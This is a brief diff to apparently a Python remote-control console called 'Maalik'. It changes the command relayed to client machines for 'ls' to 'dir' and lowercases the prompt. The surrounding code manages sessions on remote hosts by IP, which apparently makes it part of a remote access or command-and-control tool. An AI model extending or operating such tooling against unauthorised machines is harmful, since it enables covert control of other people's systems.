@@ -249,7 +249,7 @@ class ClientManage:
                 ip = iplist[location]
                 main = input(Style.BRIGHT + Fore.LIGHTCYAN_EX + "maalik >> ({ip}) : ".format(ip = ip) + Style.RESET_ALL)
                 if(main == "ls"):
-                    self.SendData("ls")
+                    self.SendData("dir")
                     self.WaitForReply()
                 elif(main == "osinfo"):
                     self.SendData("osinfo")
@@ -860,7 +860,7 @@ def Console():
     while(True):
         try:
             if(silent == False):
-                inputstr = Style.BRIGHT + Fore.LIGHTGREEN_EX + "Maalik >> " + Style.RESET_ALL + Style.BRIGHT
+                inputstr = Style.BRIGHT + Fore.LIGHTGREEN_EX + "maalik >> " + Style.RESET_ALL + Style.BRIGHT
                 x = input(inputstr)
                 args = x.split()
                 if(x == "list" or x == "sessions"):
